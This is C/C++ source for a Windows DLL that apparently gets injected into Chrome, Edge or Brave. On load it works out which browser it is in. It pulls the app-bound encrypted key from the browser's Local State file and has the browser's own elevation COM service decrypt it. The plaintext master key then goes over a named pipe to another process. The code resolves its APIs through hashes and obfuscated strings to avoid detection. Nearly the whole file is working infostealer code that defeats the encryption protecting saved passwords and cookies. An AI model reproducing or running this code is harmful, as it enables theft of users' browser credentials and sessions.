#include "DllHeaders.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// CLSIDs & IIDs

/*
Chrome's IID/CLSID (all are the same):
https://chromium.googlesource.com/chromium/src/third_party/+/refs/heads/main/win_build_output/midl/chrome/elevation_service/  [XXXX]  /elevation_service_idl_i.c

Brave's & Edge's IID/CLSID:
https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/blob/f54aa0c609950fdbe7bfc8e3bc66e3ee0a6237c2/src/payload/browser_config.hpp
*/


// CLSIDs
#define CLSID_ELEVATOR_CHROME   OBFGUID_S(0x708860E0, 0xF641, 0x4611, 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B)
#define CLSID_ELEVATOR_BRAVE    OBFGUID_S(0x576B31AF, 0x6369, 0x4B6B, 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B)
#define CLSID_ELEVATOR_EDGE     OBFGUID_S(0x1FCBE96C, 0x1697, 0x43AF, 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67)

// IIDs
#define IID_IELEVATOR_CHROMEV1  OBFGUID_S(0x463ABECF, 0x410D, 0x407F, 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8)
#define IID_IELEVATOR_CHROMEV2  OBFGUID_S(0x1BF5208B, 0x295F, 0x4992, 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38)
#define IID_IELEVATOR_CHROME    IID_IELEVATOR_CHROMEV2

#define IID_IELEVATOR_BRAVE     OBFGUID_S(0xF396861E, 0x0C8E, 0x4C71, 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9)
#define IID_IELEVATOR_EDGE      OBFGUID_S(0xC9C2B807, 0x7731, 0x4F34, 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variables

static PBYTE                g_pbDecryptedKeyV20            = NULL;
static DWORD                g_cbDecryptedKeyV20            = 0x00;

static PBYTE                g_pbDecryptedKeyV10            = NULL;
static DWORD                g_cbDecryptedKeyV10            = 0x00;

HANDLE                      g_hPipe                        = INVALID_HANDLE_VALUE;
BOOL                        g_bPipeInitialized             = FALSE;
CHAR                        g_szProcessName[MAX_PATH]      = { 0 };
DWORD                       g_dwProcessId                  = 0x00;

// DLL-owned instance of the shared resolved functions struct.
// g_pSharedFunctions (declared in Common.h) points here
SHARED_RSOLVD_FUNCTIONS     g_SharedFunctions               = {};
PSHARED_RSOLVD_FUNCTIONS    g_pSharedFunctions              = &g_SharedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeDllProjDynamicFunctions()
{
    HMODULE     hNtdllModule        = NULL,
                hBCryptModule       = NULL,
                hCrypt32Module      = NULL,
                hOle32Module        = NULL;
    SIZE_T      cbElementCount      = 0x00;
    PVOID*      ppCurrentElement    = NULL;

    if (g_SharedFunctions.pInitialized) return TRUE;

    RtlSecureZeroMemory(&g_SharedFunctions, sizeof(SHARED_RSOLVD_FUNCTIONS));

    if (!(hNtdllModule = GetModuleHandleH(FNV1A_NTDLLDLL)))
    {
        DBGA("[!] GetModuleHandleH Failed To Resolve Modules");
        return FALSE;
    }

    if (!(hBCryptModule = LoadLibraryW(OBFW_S(L"bcrypt.dll"))) || !(hCrypt32Module = LoadLibraryW(OBFW_S(L"crypt32.dll"))) || !(hOle32Module = LoadLibraryW(OBFW_S(L"ole32.dll"))))
    {
        DBGA("[!] LoadLibraryW Failed To Load Required Modules With Error: %lu", GetLastError());
        return FALSE;
    }

    // BCrypt Functions
    g_SharedFunctions.pBCryptOpenAlgorithmProvider    = (decltype(&BCryptOpenAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTOPENALGORITHMPROVIDER);
    g_SharedFunctions.pBCryptCloseAlgorithmProvider   = (decltype(&BCryptCloseAlgorithmProvider))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCLOSEALGORITHMPROVIDER);
    g_SharedFunctions.pBCryptSetProperty              = (decltype(&BCryptSetProperty))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTSETPROPERTY);
    g_SharedFunctions.pBCryptGenerateSymmetricKey     = (decltype(&BCryptGenerateSymmetricKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTGENERATESYMMETRICKEY);
    g_SharedFunctions.pBCryptDestroyKey               = (decltype(&BCryptDestroyKey))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYKEY);
    g_SharedFunctions.pBCryptFinishHash               = (decltype(&BCryptFinishHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTFINISHHASH);
    g_SharedFunctions.pBCryptDestroyHash              = (decltype(&BCryptDestroyHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDESTROYHASH);
    g_SharedFunctions.pBCryptHashData                 = (decltype(&BCryptHashData))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTHASHDATA);
    g_SharedFunctions.pBCryptCreateHash               = (decltype(&BCryptCreateHash))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTCREATEHASH);
    g_SharedFunctions.pBCryptDecrypt                  = (decltype(&BCryptDecrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDECRYPT);
    g_SharedFunctions.pBCryptDeriveKeyPBKDF2          = (decltype(&BCryptDeriveKeyPBKDF2))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTDERIVEKEYPBKDF2);
    g_SharedFunctions.pBCryptEncrypt                  = (decltype(&BCryptEncrypt))GetProcAddressH(hBCryptModule, FNV1A_BCRYPTENCRYPT);

    // Crypt32 Functions
    g_SharedFunctions.pCryptStringToBinaryA           = (decltype(&CryptStringToBinaryA))GetProcAddressH(hCrypt32Module, FNV1A_CRYPTSTRINGTOBINARYA);
    g_SharedFunctions.pCryptUnprotectData             = (decltype(&CryptUnprotectData))GetProcAddressH(hCrypt32Module, FNV1A_CRYPTUNPROTECTDATA);


    // Ole32 Functions
    g_SharedFunctions.pCoSetProxyBlanket              = (decltype(&CoSetProxyBlanket))GetProcAddressH(hOle32Module, FNV1A_COSETPROXYBLANKET);
    g_SharedFunctions.pCoInitializeEx                 = (decltype(&CoInitializeEx))GetProcAddressH(hOle32Module, FNV1A_COINITIALIZEEX);
    g_SharedFunctions.pCoCreateInstance               = (decltype(&CoCreateInstance))GetProcAddressH(hOle32Module, FNV1A_COCREATEINSTANCE);
    g_SharedFunctions.pCoUninitialize                 = (decltype(&CoUninitialize))GetProcAddressH(hOle32Module, FNV1A_COUNINITIALIZE);

     // NTAPI Functions
    g_SharedFunctions.pNtQuerySystemInformation       = (fnNtQuerySystemInformation)GetProcAddressH(hNtdllModule, FNV1A_NTQUERYSYSTEMINFORMATION);

    // Validate all function pointers (skipping pInitialized)
    cbElementCount      = (sizeof(SHARED_RSOLVD_FUNCTIONS) / sizeof(PVOID)) - 1;
    ppCurrentElement    = (PVOID*)&g_SharedFunctions + 1;

    for (SIZE_T i = 0; i < cbElementCount; i++)
    {
        if (ppCurrentElement[i] == NULL)
        {
            DBGA("[!] GetProcAddressH Failed For Function Of Index: %llu", i);
            return FALSE;
        }
    }

    g_SharedFunctions.pInitialized = (PVOID)TRUE;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


static VOID GetElevatorGuids(IN BROWSER_TYPE Browser, OUT CONST CLSID** ppClsid, OUT CONST IID** ppIid)
{
    switch (Browser)
    {
    case BROWSER_CHROME:
        *ppClsid = CLSID_ELEVATOR_CHROME;
        *ppIid   = IID_IELEVATOR_CHROME;
        break;
    case BROWSER_BRAVE:
        *ppClsid = CLSID_ELEVATOR_BRAVE;
        *ppIid   = IID_IELEVATOR_BRAVE;
        break;
    case BROWSER_EDGE:
        *ppClsid = CLSID_ELEVATOR_EDGE;
        *ppIid   = IID_IELEVATOR_EDGE;
        break;
    case BROWSER_OPERA:
    case BROWSER_OPERA_GX:
    case BROWSER_VIVALDI:
    default:
        *ppClsid = NULL;
        *ppIid   = NULL;
        break;
    }
}

static PDATA_PACKET CreatePacket(IN DWORD dwSignature, IN PBYTE pPacketData, IN DWORD dwPacketDataSize)
{
    PDATA_PACKET pktData = NULL;

    if (!(pktData = (PDATA_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PACKET_SIZE(dwPacketDataSize))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    RtlCopyMemory(pktData->bData, pPacketData, dwPacketDataSize);

    pktData->dwSignature    = dwSignature;
    pktData->dwDataSize     = dwPacketDataSize;

    return pktData;
}

static BOOL SendDataToPipe(IN HANDLE hPipe, IN DWORD dwSignature, IN PBYTE pbData, IN DWORD cbDataSize)
{
    PDATA_PACKET    pktData         = NULL;
    DWORD           dwBytesWritten  = 0x00;
    DWORD           dwPacketSize    = PACKET_SIZE(cbDataSize);
    BOOL            bResult         = FALSE;

    if (!hPipe || hPipe == INVALID_HANDLE_VALUE || !pbData || cbDataSize == 0)
        return FALSE;

    if (!(pktData = CreatePacket(dwSignature, pbData, cbDataSize)))
        return FALSE;

    if (!WriteFile(hPipe, pktData, dwPacketSize, &dwBytesWritten, NULL))
    {
        DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    FlushFileBuffers(hPipe);

    bResult = (dwBytesWritten == dwPacketSize);

_END_OF_FUNC:
    
    HEAP_FREE_SECURE(pktData, dwPacketSize);
    
    return bResult;
}

static BOOL SendAppBoundKeyRecord(IN HANDLE hPipe, IN PBYTE pbKey, IN DWORD dwKeyLen)
{
    return SendDataToPipe(hPipe, PACKET_SIG_APP_BOUND_KEY, pbKey, dwKeyLen);
}

static BOOL SendDpapiKeyRecord(IN HANDLE hPipe, IN PBYTE pbKey, IN DWORD dwKeyLen)
{
    return SendDataToPipe(hPipe, PACKET_SIG_DPAPI_KEY, pbKey, dwKeyLen);
}

static BOOL SendCompletionSignal(IN HANDLE hPipe)
{
    DATA_PACKET     pktComplete     = { 0 };
    DWORD           dwBytesWritten  = 0x00;

    if (!hPipe || hPipe == INVALID_HANDLE_VALUE)
        return FALSE;

    pktComplete.dwSignature = PACKET_SIG_COMPLETE;
    pktComplete.dwDataSize  = 0;

    if (!WriteFile(hPipe, &pktComplete, sizeof(DATA_PACKET), &dwBytesWritten, NULL))
    {
        DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    FlushFileBuffers(hPipe);

    return (dwBytesWritten == sizeof(DATA_PACKET));
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ExtractV20KeyFromLocalState(IN BROWSER_TYPE Browser, OUT PBYTE* ppbEncryptedKey, OUT PDWORD pdwEncryptedKeySize)
{
    LPSTR   pszLocalStatePath   = NULL;
    LPSTR   pszFileContent      = NULL;
    LPSTR   pszBase64Key        = NULL;
    PBYTE   pbDecodedKey        = NULL;
    CHAR    szRelPath[MAX_PATH] = { 0 };
    DWORD   dwFileSize          = 0x00,
            dwBase64KeyLen      = 0x00,
            dwDecodedKeyLen     = 0x00;
    BOOL    bResult             = FALSE;

    if (!ppbEncryptedKey || !pdwEncryptedKeySize)
        return FALSE;

    *ppbEncryptedKey        = NULL;
    *pdwEncryptedKeySize    = 0x00;
    
    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszLocalStatePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if (!ReadFileFromDiskA(pszLocalStatePath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    pszBase64Key = FindNestedJsonValue(pszFileContent, dwFileSize, JSON_PARENT_KEY, JSON_CHILD_KEY, &dwBase64KeyLen);
    if (!pszBase64Key || dwBase64KeyLen == 0)
    {
        DBGA("[!] FindNestedJsonValue Failed To Get %s:%s", JSON_PARENT_KEY, JSON_CHILD_KEY);
        goto _END_OF_FUNC;
    }

    DBGV("[v] Found %s::%s:%s", pszLocalStatePath, JSON_PARENT_KEY, JSON_CHILD_KEY);

    if (!(pbDecodedKey = Base64Decode(pszBase64Key, dwBase64KeyLen, &dwDecodedKeyLen)))
        goto _END_OF_FUNC;

    if (dwDecodedKeyLen <= CRYPT_APPBOUND_KEY_PREFIX_LEN || *(PDWORD)pbDecodedKey != CRYPT_APPBOUND_KEY_PREFIX)
    {
        DBGA("[!] Decoded Key Is Invlaid!");
        goto _END_OF_FUNC;
    }

    *pdwEncryptedKeySize = dwDecodedKeyLen - CRYPT_APPBOUND_KEY_PREFIX_LEN;

    if (!(*ppbEncryptedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwEncryptedKeySize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        *pdwEncryptedKeySize = 0x00;
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(*ppbEncryptedKey, pbDecodedKey + CRYPT_APPBOUND_KEY_PREFIX_LEN, *pdwEncryptedKeySize);
    
    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbDecodedKey);
    HEAP_FREE(pszFileContent);
    HEAP_FREE(pszLocalStatePath);
    return bResult;
}

static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
{
    IElevator*      pElevator           = NULL;
    IElevatorEdge*  pElevatorEdge       = NULL;
    PBYTE           pbEncryptedKey      = NULL;
    DWORD           dwEncryptedKeySize  = 0x00,
                    dwLastError         = ERROR_GEN_FAILURE;
    BSTR            bstrCiphertext      = NULL,
                    bstrPlaintext       = NULL;
    LPSTR           pszHexKey           = NULL;
    HRESULT         hResult             = S_OK;
    BOOL            bResult             = FALSE;
    CONST CLSID*    pClsid              = NULL;
    CONST IID*      pIid                = NULL;

    GetElevatorGuids(Browser, &pClsid, &pIid);
    
    if (!pClsid || !pIid)
    {
        DBGA("[!] Invalid Browser Type");
        return FALSE;
    }

    if (FAILED((hResult = g_SharedFunctions.pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED))))
    {
        DBGA("[!] CoInitializeEx Failed With Error: 0x%08X", hResult);
        return FALSE;
    }

    // Create the appropriate COM instance based on browser type
    // Msedge
    if (Browser == BROWSER_EDGE)
    {
        if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevatorEdge))))
        {
            DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
            goto _END_OF_FUNC;
        }

        hResult = g_SharedFunctions.pCoSetProxyBlanket(
            (IUnknown*)pElevatorEdge,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }
    // Chrome or Brave
    else 
    {
        if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator))))
        {
            if (hResult == E_NOINTERFACE && Browser == BROWSER_CHROME)
            {
                // Fallback To IID V1 If Chrome
                pIid = IID_IELEVATOR_CHROMEV1;

                DBGV("[i] Falling Back To Chrome's V1 IID ...");

                if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator))))
                {
                    DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
                    goto _END_OF_FUNC;
                }
            }
            else
            {
                DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
                goto _END_OF_FUNC;
            }
        }

        hResult = g_SharedFunctions.pCoSetProxyBlanket(
            (IUnknown*)pElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }

    if (FAILED(hResult))
    {
        DBGA("[!] CoSetProxyBlanket Failed With Error: 0x%08X", hResult);
        goto _END_OF_FUNC;
    }

    if (!ExtractV20KeyFromLocalState(Browser, &pbEncryptedKey, &dwEncryptedKeySize))
        goto _END_OF_FUNC;

    if (!(bstrCiphertext = SysAllocStringByteLen((LPCSTR)pbEncryptedKey, dwEncryptedKeySize)))
        goto _END_OF_FUNC;

    // Call DecryptData using the appropriate interface
    // Msedge
    if (Browser == BROWSER_EDGE)
    {
        if (FAILED((hResult = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrCiphertext, &bstrPlaintext, &dwLastError))))
        {
            DBGA("[!] IElevatorEdge::DecryptData [%d] Failed With Error: 0x%08X (LastError: %lu)", __LINE__, hResult, dwLastError);
            goto _END_OF_FUNC;
        }
    }
    // Chrome or Brave
    else 
    {
        if (FAILED((hResult = pElevator->lpVtbl->DecryptData(pElevator, bstrCiphertext, &bstrPlaintext, &dwLastError))))
        {
            DBGA("[!] IElevator::DecryptData [%d] Failed With Error: 0x%08X (LastError: %lu)", __LINE__, hResult, dwLastError);
            goto _END_OF_FUNC;
        }
    }

    DBGV("[*] Function 'DecryptData' Succeeded For: %s!", GetBrowserName(Browser));

    g_cbDecryptedKeyV20 = BUFFER_SIZE_32;

    if (!(g_pbDecryptedKeyV20 = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_cbDecryptedKeyV20)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(g_pbDecryptedKeyV20, (PVOID)bstrPlaintext, g_cbDecryptedKeyV20);

    if ((pszHexKey = BytesToHexString(g_pbDecryptedKeyV20, g_cbDecryptedKeyV20)))
        DBGV("-> key : %s", pszHexKey);

    if (!SendAppBoundKeyRecord(g_hPipe, g_pbDecryptedKeyV20, g_cbDecryptedKeyV20))
    {
        DBGA("[!] SendAppBoundKeyRecord Failed To Send The Key");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:

    HEAP_FREE(pszHexKey);
    HEAP_FREE(pbEncryptedKey);

    if (bstrPlaintext)
        SysFreeString(bstrPlaintext);
    if (bstrCiphertext)
        SysFreeString(bstrCiphertext);
    
    if (pElevator)
        pElevator->lpVtbl->Release(pElevator);
    if (pElevatorEdge)
        pElevatorEdge->lpVtbl->Release(pElevatorEdge);

    g_SharedFunctions.pCoUninitialize();

    return bResult;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD WINAPI ExtractBrowserDecryptionKeys(LPVOID lpParam)
{
    BROWSER_TYPE    Browser         = (BROWSER_TYPE)(ULONG_PTR)lpParam;
    BOOL            bHasV10Key      = FALSE;
    BOOL            bHasV20Key      = FALSE;

    DBGV("[v] Starting %s Keys Extraction...", GetBrowserName(Browser));

    // If Not Opera or Vivaldi, Extract The V20 key (i.e., if Chrome, Edge, Brave)
    if (Browser != BROWSER_VIVALDI && Browser != BROWSER_OPERA && Browser != BROWSER_OPERA_GX)
    {
        if (!(bHasV20Key = ExtractDecryptedV20KeyFromLocalState(Browser)))
        {
            DBGA("[!] ExtractDecryptedV20KeyFromLocalState Failed For %s", GetBrowserName(Browser));
        }
    }

    if (!bHasV10Key && !bHasV20Key)
    {
        DBGA("[!] No Decryption Keys Available For %s ...", GetBrowserName(Browser));
    }


    HEAP_FREE_SECURE(g_pbDecryptedKeyV20, g_cbDecryptedKeyV20);
    HEAP_FREE_SECURE(g_pbDecryptedKeyV10, g_cbDecryptedKeyV10);

    g_cbDecryptedKeyV20 = 0;
    g_cbDecryptedKeyV10 = 0;

    DeleteDataFilesCache();

    SendCompletionSignal(g_hPipe);

    DBGA_CLOSE();

    return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BROWSER_TYPE DetectBrowserFromProcess()
{
    CHAR    szModulePath[MAX_PATH]  = { 0 };
    LPSTR   pszFileName             = NULL;

    if (!GetModuleFileNameA(NULL, szModulePath, MAX_PATH))
        return BROWSER_UNKNOWN;

    pszFileName = PathFindFileNameA(szModulePath);

    if (StrStrIA(pszFileName, STR_BRAVE_BRSR_NAME))
        return BROWSER_BRAVE;
    else if (StrStrIA(pszFileName, STR_EDGE_BRSR_NAME) || StrStrIA(pszFileName, STR_EDGE_ALT_BRSR_NAME))
        return BROWSER_EDGE;
    else if (StrStrIA(pszFileName, STR_CHROME_BRSR_NAME))
        return BROWSER_CHROME;
    
    return BROWSER_UNKNOWN;
}
 
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) 
{
    HANDLE          hThread         = NULL;
    BROWSER_TYPE    BrowserType     = BROWSER_CHROME;
    
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);

            g_bPipeInitialized  = InitializeOutputPipe(&g_hPipe);
            BrowserType         = DetectBrowserFromProcess();

            if (!InitializeDllProjDynamicFunctions())
                break;

            DBGV("[+] Detected Browser: %s", GetBrowserName(BrowserType));

            if (BrowserType == BROWSER_UNKNOWN)
            {
                DBGA("[!] Unknown Browser Process, Aborting...");
                break;
            }
            
            if (!(hThread = CreateThread(NULL, 0, ExtractBrowserDecryptionKeys, (LPVOID)(ULONG_PTR)BrowserType, 0, NULL)))
            {
                DBGA("[!] CreateThread Failed With Error: %lu", GetLastError());
                break;
            }

            CloseHandle(hThread);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}